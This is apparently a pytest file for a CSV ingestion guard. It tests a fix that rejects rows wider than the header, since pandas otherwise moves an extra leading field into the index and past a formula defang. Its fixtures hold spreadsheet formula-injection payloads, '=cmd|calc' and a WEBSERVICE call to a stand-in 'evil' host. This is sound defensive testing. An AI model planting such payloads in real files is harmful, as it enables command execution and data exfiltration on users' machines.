"""Contract tests for the R11 remediation: field-count invariant guard.

R11 (implicit-index type confusion): when a CSV header declares N columns and
every data row supplies N+1 fields, pandas' C parser silently routes the extra
LEADING field into df.index instead of raising. A G7 formula-defang that only
scrubs df.columns / column bodies never touches df.index, and df.to_csv() writes
the index by default -- so an attacker's `=cmd|...` / `=WEBSERVICE(...)` cell
round-trips live into the exported CSV the reviewer opens in Excel.

Empirically established on pandas 3.0.2 (see SECURITY.md R11):
  * on_bad_lines='error' does NOT fire for this case.
  * index_col=False silently DROPS the extra field with only a ParserWarning
    (data loss, not a reject).
Therefore the only sound fix is an explicit, quote/delimiter-aware field-count
invariant that hard-rejects BEFORE pandas assigns an implicit index.
"""

import io

import pytest

from copilot.errors import MalformedInput
from copilot.ingest.field_count import (
    assert_uniform_field_count,
    read_csv_guarded,
)


# --- The vulnerability, pinned as a regression witness -----------------------

def test_default_pandas_routes_payload_into_index():
    """Documents the raw pandas behaviour the guard exists to stop.

    If a future pandas changes this, we want the test to shout so the guard's
    rationale can be re-evaluated -- not silently drift.
    """
    pd = pytest.importorskip("pandas")
    csv = 'a,b,c\n=cmd|calc,10,20,30\n=WEBSERVICE("http://evil"),40,50,60\n'
    df = pd.read_csv(io.StringIO(csv))
    # Columns look clean...
    assert list(df.columns) == ["a", "b", "c"]
    # ...but the attacker payload is sitting in the index, invisible to a
    # column-only defang, and to_csv() will re-emit it live.
    assert any(str(v).startswith("=") for v in df.index)
    assert df.to_csv().splitlines()[1].startswith("=")


# --- The guard: hard-reject ragged rows --------------------------------------

def test_guard_rejects_extra_leading_field_payload():
    csv = 'a,b,c\n=cmd|calc,10,20,30\n'
    with pytest.raises(MalformedInput) as exc:
        assert_uniform_field_count(io.StringIO(csv))
    assert exc.value.row_index == 0  # first data row is 0-based (header not counted)
    assert "3" in str(exc.value)     # header width surfaced


def test_guard_rejects_short_row_too():
    # Fewer fields than the header is equally a structural mismatch.
    csv = "a,b,c\n1,2\n"
    with pytest.raises(MalformedInput):
        assert_uniform_field_count(io.StringIO(csv))


def test_read_csv_guarded_raises_before_dataframe_exists():
    pytest.importorskip("pandas")
    csv = 'a,b,c\n=cmd|calc,10,20,30\n'
    with pytest.raises(MalformedInput):
        read_csv_guarded(io.StringIO(csv))


# --- The guard must not break legitimate data --------------------------------

def test_guard_accepts_clean_data():
    csv = "a,b,c\n1,2,3\n4,5,6\n"
    assert assert_uniform_field_count(io.StringIO(csv)) == 3


def test_read_csv_guarded_returns_dataframe_for_clean_data():
    pd = pytest.importorskip("pandas")
    csv = "a,b,c\n1,2,3\n4,5,6\n"
    df = read_csv_guarded(io.StringIO(csv))
    assert list(df.columns) == ["a", "b", "c"]
    assert df.shape == (2, 3)
    # Index must be the default RangeIndex -- no field was smuggled into it.
    assert isinstance(df.index, pd.RangeIndex)


def test_guard_is_quote_aware_embedded_delimiter():
    # A quoted comma is ONE field, not two. A naive str.count(',') guard would
    # false-positive here; the guard must use the same dialect pandas will.
    csv = 'name,note,amount\n"Smith, Jr.","hello, world",10\n'
    assert assert_uniform_field_count(io.StringIO(csv)) == 3


def test_guard_is_quote_aware_embedded_newline():
    # A quoted newline stays within one logical record.
    csv = 'name,note,amount\n"multi\nline note","x",10\n'
    assert assert_uniform_field_count(io.StringIO(csv)) == 3


def test_guard_respects_declared_delimiter():
    tsv = "a\tb\tc\n1\t2\t3\n"
    assert assert_uniform_field_count(io.StringIO(tsv), delimiter="\t") == 3


# --- Excel path: same invariant over the read matrix -------------------------

def test_excel_width_guard_rejects_ragged_matrix():
    from copilot.ingest.field_count import assert_uniform_row_width

    header = ["a", "b", "c"]
    rows = [["1", "2", "3"], ["=cmd|calc", "4", "5", "6"]]  # second row too wide
    with pytest.raises(MalformedInput):
        assert_uniform_row_width(header, rows)


def test_excel_width_guard_accepts_uniform_matrix():
    from copilot.ingest.field_count import assert_uniform_row_width

    header = ["a", "b", "c"]
    rows = [["1", "2", "3"], ["4", "5", "6"]]
    assert assert_uniform_row_width(header, rows) == 3


# --- Empty / header-only inputs are a clean reject, not a crash --------------

def test_guard_rejects_empty_input():
    with pytest.raises(MalformedInput):
        assert_uniform_field_count(io.StringIO(""))
